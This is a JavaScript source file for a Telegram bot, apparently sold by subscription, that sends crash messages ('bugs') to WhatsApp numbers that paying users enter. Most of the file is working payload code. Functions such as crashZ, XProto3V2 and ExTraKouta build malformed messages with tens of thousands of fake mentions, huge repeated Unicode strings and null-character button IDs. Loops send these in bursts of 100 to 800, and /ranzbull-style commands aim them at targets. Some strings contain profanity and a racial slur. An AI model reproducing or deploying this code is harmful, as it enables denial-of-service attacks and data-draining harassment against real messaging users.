                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

// ------ ( Tama Function ) ------- \\
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                PhotoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "Photo/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "༑ ▾𝐑͜𝐄͢𝐍 🇷🇺 𝐗͜𝐎͡𝐏͢𝐎͜𝐖͡𝐍⟅̊༑ ▾",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".⟅̊༑ ▾𝐑͜𝐄͢𝐍 🇷🇺 𝐗͜𝐎͡𝐏͢𝐎͜𝐖͡𝐍⟅̊༑ ▾" + "貍賳貎🦠𝐗͜-𝐑͡𝐀͢𝐘⟅̊༑ ▾俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}



async function kuota(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            delayBrutal(target)
            ]) Ng
            console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

async function XProto3V2(sock, target, mention) {
    const protoMessage = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘" + "🥶".repeat(101),
                    height: 010,
                    width: 101,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "99988877766@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "uknown",
                                    songId: "870166291800508",
                                    author: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝟑" + "᭱".repeat(9999),
                                    title: "𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://t.me/FunctionLihX",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", protoMessage.message, {
        messageId: protoMessage.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: protoMessage.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function crashZ(target) {
    const etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "974197419741",
                                pageCount: "974197419741",
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "DARKNESS JIR🤡",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            hasMediaAttachment: true,
                            jpegThumbnail: "",
                        },
                        orderMessage: {
                            orderId: "CRASHCODE9471",
                            thumbnail: "",
                            itemCount: 999999999,
                            status: "INQUIRY",
                            surface: "CATALOG",
                            message: "MAMPUS KENA BUG 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘🩸" + "ꦽ".repeat(103000) + "ꦾ".repeat(70000),
                            orderTitle: "INFINITY",
                            sellerJid: "13135550002@s.whatsapp.net",
                            token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
                            totalAmount1000: "100000019492000",
                            totalCurrencyCode: "IDR",
                            messageVersion: 2,
                        },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target, "13135550002@s.whatsapp.net"],
                            quotedMessage: {
                                buttonsMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                        fileLength: "9999999999999",
                                        pageCount: 3567587327,
                                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                        fileName: "I,M NEED PUSY",
                                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mediaKeyTimestamp: "1735456100",
                                        contactVcard: true,
                                        caption: "do you have a pussy?"
                                    },
                                    contentText: "Need Pussy",
                                    footerText: "Dimzxzzx",
                                    buttons: [
                                        {
                                            buttonId: "\u0000".repeat(900000),
                                            buttonText: {
                                                displayText: "I Need Pussy Bro"
                                            },
                                            type: 1
                                        }
                                    ],
                                    headerType: 3
                                }
                            }
                        }
                    }
                }
            }
        }),
        {
            userJid: target,
            quoted: QBug
        }
    );

    await sock.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id
    });
}

async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function frezbuttoninvis(target) {
    const spamMessage = "@1".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    
    
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "'ryzen is here 🥵",
                    previewType: "Hola 🤣",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await sock.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "Fuck you Lookin at, nigga" },
                    content: undefined
                }
            ]
        }
    );
}

async function ParamsCall(target) {
  for (let i = 0; i < 100; i++) {
      await OverParams(target);
      await 
      console.log(chalk.red("Send Bug Succes"))
  }
}
async function Delayinvis(target) {
  for (let i = 0; i < 100; i++) {
      await XProto3V2(target);
      await delayBrutal(target);
      await crashZ(target);
      await frezbuttoninvis(target);
      console.log(chalk.red("Send Bug Succes"))
    }
}
async function TrazKouta(target) {
  for (let i = 0; i < 200; i++) {
      await ExTraKouta(target);
      await sleep(3000)
      console.log(chalk.red("Send Bug Succes"))
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}



// ------------ ( Comand Handler ) --------------- \\
const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/TgfrM.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

  bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
    caption: `\`\`\`
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
╰═─══─══─══─══─══─═⬡

╔═─═⊱ Information - User
┃ Username : ${username}
┃ UserID : ${senderId}
┃ Premium? : ${premiumStatus}
╰═─══─══─══─══─══─═⬡
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bugmenu") {
      caption = `\`\`\`
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
╰═─══─══─══─══─══─═⬡


╔═─═⊱ Bug - Menu
┃ 
┃ /ranzbull → boros kouta + delay ( recommend )
┃ 
╰═─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "settinjjhg") {
      caption = `\`\`\`
╔═─═⊱ ( 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 )
┃ Developer : 𝐍𝐞𝐩𝐭𝐮𝐧𝐮𝐬𝐗𝐝
┃ Version : 1.0
┃ Bot name : 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
┃ Language : commonJs
╰═─══─══─══─══─══─═⬡

╔═─═⊱ ( From Neptunus )
┃ Thank you to everyone who
┃ has bought SC 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘, I am 
┃ lucky to have buyers like you.
╰═─══─══─══─══─══─═⬡

╔═─═⊱ Setings - Menu
┃ /addpairing 62xxx 
┃ /addprem ID
┃ /delprem ID
┃ /listprem
┃ /setjeda
┃ /only grup on | off
╰══─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "owner_mhhhbenu") {
      caption = `\`\`\`
╔═─═⊱ ( 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 )
┃ Developer : 𝐍𝐞𝐩𝐭𝐮𝐧𝐮𝐬𝐗𝐝
┃ Version : 1.0
┃ Bot name : 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
┃ Language : commonJs
╰═─══─══─══─══─══─═⬡

╔═─═⊱ ( From Neptunus )
┃ Thank you to everyone who
┃ has bought SC 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘, I am 
┃ lucky to have buyers like you.
╰═─══─══─══─══─══─═⬡

╔═─═⊱ ( Owner Only )
┃ /addadmin ID
┃ /deladmin ID
╰═─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
╰═─══─══─══─══─══─═⬡

╔═─═⊱ Information - User
┃ Username : ${username}
┃ UserID : ${senderId}
┃ Premium? : ${premiumStatus}
╰═─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://qu.ax/TgfrM.jpg",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ---------------- ( Case bug Handler ) ----------------------- \\
bot.onText(/\/Delaycrhhbbbash (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://files.catbox.moe/n3p1cf.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/LibornXFoxzy" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/n3p1cf.jpg", {
           caption: `
\`\`\`( ☠️ ) - 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

©Neptunus
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Delayinvis(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

©Neptunus
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

/* 
  (-) Break (-)
*/

bot.onText(/\/ranzbull (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`( ☠️ ) -  𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃
📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

 © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await TrazKouta(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

 © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

/* 
  (-) Break (-)
*/

bot.onText(/\/makangratihhbbs (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://files.catbox.moe/n3p1cf.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/LibornXFoxzy" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/n3p1cf.jpg", {
           caption: `
\`\`\`
( ☠️ ) - 𝐋𝐈𝐁𝐎𝐑𝐍 𝐃𝐄𝐀𝐓𝐇
📁 Target : ${formattedNumber}
